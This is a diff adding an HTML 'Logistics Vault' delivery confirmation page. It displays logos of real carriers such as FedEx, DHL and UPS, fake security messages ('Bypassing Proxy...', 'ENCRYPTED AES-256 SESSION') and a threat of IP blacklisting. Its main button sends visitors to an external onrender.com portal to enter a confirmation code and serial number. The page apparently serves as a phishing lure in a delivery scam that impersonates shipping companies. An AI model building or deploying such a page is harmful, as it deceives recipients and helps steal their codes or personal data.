@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enterprise Logistics Portal | Secure Access</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+
+    <style>
+        :root {
+            --primary: #0ea5e9;
+            --primary-dark: #0284c7;
+            --success: #22c55e;
+            --bg: #f1f5f9;
+            --panel-dark: #0f172a;
+            --glass: rgba(255, 255, 255, 0.9);
+            --font-mono: 'JetBrains Mono', monospace;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: var(--bg);
+            color: #1e293b;
+            min-height: 100vh;
+            overflow: hidden; /* Hidden until loaded */
+        }
+
+        /* 1. CINEMATIC LOADER */
+        #loader {
+            position: fixed;
+            inset: 0;
+            background: #020617;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary);
+            font-family: var(--font-mono);
+            transition: opacity 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .loader-content { width: 300px; }
+        .loader-bar {
+            height: 2px;
+            width: 0%;
+            background: var(--primary);
+            box-shadow: 0 0 15px var(--primary);
+            margin: 20px 0;
+            transition: width 0.4s ease;
+        }
+        .loader-status { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 2px; opacity: 0.8; }
+
+        /* 2. CORE UI */
+        #network-canvas {
+            position: fixed;
+            inset: 0;
+            z-index: -1;
+            opacity: 0.4;
+        }
+
+        .container {
+            max-width: 1240px;
+            margin: auto;
+            padding: 60px 24px;
+            width: 100%;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 1s ease 0.5s;
+        }
+
+        .container.visible { opacity: 1; transform: translateY(0); }
+
+        .header { text-align: center; margin-bottom: 60px; }
+        
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            padding: 6px 16px;
+            background: white;
+            border-radius: 100px;
+            font-size: 0.7rem;
+            font-weight: 800;
+            border: 1px solid #e2e8f0;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);
+            margin-bottom: 24px;
+        }
+
+        .header h1 {
+            font-size: clamp(2.5rem, 5vw, 4.5rem);
+            font-weight: 800;
+            letter-spacing: -0.04em;
+            color: var(--panel-dark);
+            line-height: 0.9;
+        }
+
+        /* BENTO GRID */
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1.5fr 1fr;
+            gap: 24px;
+            margin-bottom: 40px;
+        }
+
+        .card {
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            border-radius: 32px;
+            padding: 48px;
+            border: 1px solid rgba(255,255,255,0.8);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.05);
+            transition: transform 0.1s ease-out;
+        }
+
+        .info-side {
+            background: var(--panel-dark);
+            color: white;
+            padding: 40px;
+            border-radius: 32px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Scanline Overlay */
+        .info-side::after {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), 
+                        linear-gradient(90deg, rgba(255, 0, 0, 0.02), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.02));
+            background-size: 100% 3px, 3px 100%;
+            pointer-events: none;
+        }
+
+        /* STEPS */
+        .step { display: flex; gap: 24px; margin-bottom: 32px; }
+        .step-icon {
+            width: 56px; height: 56px;
+            background: #fff;
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary);
+            box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
+        }
+
+        /* BUTTON UPGRADE */
+        .btn-primary {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            background: var(--primary);
+            color: white;
+            padding: 22px;
+            border-radius: 20px;
+            font-weight: 700;
+            text-decoration: none;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 20px 40px -10px rgba(14, 165, 233, 0.5);
+            transition: 0.3s;
+        }
+
+        .btn-primary:hover {
+            transform: scale(1.02);
+            background: var(--primary-dark);
+        }
+
+        .btn-primary::before {
+            content: "";
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+
+        .btn-primary:hover::before { left: 100%; }
+
+        /* MARQUEE */
+        .marquee-wrap {
+            padding: 30px 0;
+            background: white;
+            border-radius: 24px;
+            overflow: hidden;
+            border: 1px solid #e2e8f0;
+        }
+
+        .marquee-track {
+            display: flex;
+            gap: 60px;
+            width: max-content;
+            animation: slide 60s linear infinite;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 700;
+            color: #64748b;
+            font-size: 0.9rem;
+        }
+
+        .brand img { width: 24px; height: 24px; border-radius: 4px; }
+
+        @keyframes slide { from { transform: translateX(0); } to { transform: translateX(-50%); } }
+
+        @media (max-width: 900px) {
+            .main-grid { grid-template-columns: 1fr; }
+            body { overflow: auto; }
+        }
+    </style>
+</head>
+<body>
+
+<div id="loader">
+    <div class="loader-content">
+        <div id="loader-msg" class="loader-status">Initializing Core...</div>
+        <div class="loader-bar" id="loader-bar"></div>
+        <div style="font-size: 0.5rem; opacity: 0.4; letter-spacing: 1px;">ENCRYPTED AES-256 SESSION</div>
+    </div>
+</div>
+
+<canvas id="network-canvas"></canvas>
+
+<div class="container" id="main-ui">
+    <div class="header">
+        <div class="badge"><span style="color:var(--success); margin-right:8px">●</span> SYSTEM: SECURE CONNECTION ESTABLISHED</div>
+        <h1>Logistics Vault</h1>
+    </div>
+
+    <div class="main-grid">
+        <div class="card" id="tilt-1">
+            <h2 style="margin-bottom: 8px; font-weight: 800;">Welcome to Your Delivery Confirmation Portal</h2>
+            <p style="color:#64748b; margin-bottom: 32px; font-size: 0.95rem;">Thank you for choosing our delivery service.</p>
+            
+            <div class="step">
+                <div class="step-icon"><i data-lucide="shield-check"></i></div>
+                <div>
+                    <h3 style="font-size:1.1rem">Verify Delivery</h3>
+                    <p style="color:#64748b; font-size:0.9rem">Enter your unique <strong>Confirmation Code</strong> and <strong>Serial Number</strong> provided to you.</p>
+                </div>
+            </div>
+            
+            <div class="step">
+                <div class="step-icon"><i data-lucide="lock"></i></div>
+                <div>
+                    <h3 style="font-size:1.1rem">Secure Access</h3>
+                    <p style="color:#64748b; font-size:0.9rem">Your confirmation is private and encrypted. Only you can access your details using the correct code combination.</p>
+                </div>
+            </div>
+
+            <a href="https://ideal-happiness-v9yc.onrender.com/portal.html" class="btn-primary">
+                Confirm & Update Shipping Record <i data-lucide="chevron-right"></i>
+            </a>
+        </div>
+
+        <div class="info-side" id="tilt-2">
+            <div style="position:relative; z-index: 1;">
+                <p style="font-family: var(--font-mono); font-size:0.6rem; color:var(--primary); margin-bottom:20px;">[ STREAMING DATA ]</p>
+                <div style="margin-bottom:30px">
+                    <p style="opacity:0.5; font-size:0.75rem;">MANIFEST ID</p>
+                    <p style="font-family: var(--font-mono); font-size:1.2rem; font-weight:700;">SF-INTL-7782-X</p>
+                </div>
+                <div style="margin-bottom:30px">
+                    <p style="opacity:0.5; font-size:0.75rem;">REAL-TIME STATUS</p>
+                    <p id="live-loc" style="font-weight:600; color:var(--success);">Awaiting Auth...</p>
+                </div>
+                <div style="background:rgba(255,255,255,0.05); padding:20px; border-radius:16px; border: 1px solid rgba(255,255,255,0.1);">
+                    <p style="font-size:0.8rem; line-height:1.5; opacity:0.7;">Kindly ensure to Enter your unique Confirmation Code and Serial Number provided.. Unauthorized access will result in immediate IP blacklisting.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="marquee-wrap">
+        <div class="marquee-track" id="brand-track"></div>
+    </div>
+</div>
+
+<script>
+    // 1. LOADER SEQUENCE
+    const messages = ["Mounting Drive...", "Bypassing Proxy...", "Verifying TLS 1.3...", "Session Ready"];
+    let mIdx = 0;
+    const bar = document.getElementById('loader-bar');
+    const msg = document.getElementById('loader-msg');
+    
+    const interval = setInterval(() => {
+        mIdx++;
+        if(mIdx < messages.length) {
+            msg.innerText = messages[mIdx];
+            bar.style.width = (mIdx * 33) + "%";
+        } else {
+            clearInterval(interval);
+            bar.style.width = "100%";
+            setTimeout(() => {
+                document.getElementById('loader').style.opacity = '0';
+                document.body.style.overflow = 'auto';
+                document.getElementById('main-ui').classList.add('visible');
+                setTimeout(() => document.getElementById('loader').remove(), 800);
+            }, 500);
+        }
+    }, 600);
+
+    // 2. ICONS & BRANDING
+    lucide.createIcons();
+    const brands = [
+        { n: 'SF Express', d: 'sf-express.com' },
+        { n: 'FedEx', d: 'fedex.com' },
+        { n: 'DHL Global', d: 'dhl.com' },
+        { n: 'Maersk', d: 'maersk.com' },
+        { n: 'UPS', d: 'ups.com' },
+        { n: 'DB Schenker', d: 'dbschenker.com' }
+    ];
+    const track = document.getElementById('brand-track');
+    [...brands, ...brands].forEach(b => {
+        const d = document.createElement('div');
+        d.className = 'brand';
+        d.innerHTML = `<img src="https://www.google.com/s2/favicons?sz=64&domain=${b.d}" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiM2NDc0OGIiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cGF0aCBkPSJNMjEgOGwtOS00LTkgNE0yMSAxMmwtOS00LTkgNCIvPjxwYXRoIGQ9Ik0yMSA4djhoTTMgOHY4bTkgNHY0Ii8+PC9zdmc+'"> <span>${b.n}</span>`;
+        track.appendChild(d);
+    });
+
+    // 3. CANVAS BACKGROUND
+    const canvas = document.getElementById('network-canvas');
+    const ctx = canvas.getContext('2d');
+    let pts = [];
+    function res() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+    window.onresize = res; res();
+    for(let i=0; i<60; i++) pts.push({x: Math.random()*canvas.width, y: Math.random()*canvas.height, vx: Math.random()-0.5, vy: Math.random()-0.5});
+    function draw() {
+        ctx.clearRect(0,0,canvas.width, canvas.height);
+        ctx.strokeStyle = "rgba(14, 165, 233, 0.1)";
+        pts.forEach((p, i) => {
+            p.x += p.vx; p.y += p.vy;
+            if(p.x<0 || p.x>canvas.width) p.vx*=-1;
+            if(p.y<0 || p.y>canvas.height) p.vy*=-1;
+            for(let j=i+1; j<pts.length; j++) {
+                let d = Math.hypot(p.x-pts[j].x, p.y-pts[j].y);
+                if(d < 150) { ctx.beginPath(); ctx.moveTo(p.x,p.y); ctx.lineTo(pts[j].x,pts[j].y); ctx.stroke(); }
+            }
+        });
+        requestAnimationFrame(draw);
+    }
+    draw();
+
+    // 4. INTERACTIVITY
+    const cards = document.querySelectorAll('.card, .info-side');
+    cards.forEach(c => {
+        c.addEventListener('mousemove', e => {
+            let r = c.getBoundingClientRect();
+            let x = (e.clientX - r.left) / r.width - 0.5;
+            let y = (e.clientY - r.top) / r.height - 0.5;
+            c.style.transform = `perspective(1000px) rotateY(${x*6}deg) rotateX(${-y*6}deg)`;
+        });
+        c.addEventListener('mouseleave', () => c.style.transform = ``);
+    });
+
+    const locs = ["Verifying Node...", "Route: CN -> US", "Customs Prep", "Finalizing Ledger"];
+    let lIdx = 0;
+    setInterval(() => {
+        document.getElementById('live-loc').innerText = locs[lIdx % locs.length];
+        lIdx++;
+    }, 3000);
+</script>
+
+</body>
+</html>
